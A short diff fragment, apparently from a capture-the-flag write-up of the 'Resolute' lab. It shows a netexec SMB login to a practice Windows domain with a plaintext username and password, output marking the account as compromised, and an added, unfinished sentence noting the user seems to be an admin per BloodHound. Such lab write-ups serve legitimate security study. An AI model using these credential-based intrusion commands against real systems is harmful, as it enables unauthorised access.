@@ -254,3 +254,5 @@ nxc smb resolute.megabank.local -u ryan -p 'Serv3r4Admin4cc123!'
 SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
 SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
 ```
+This user account is compromised and they are some form of admin looking at bloodhound they s
+
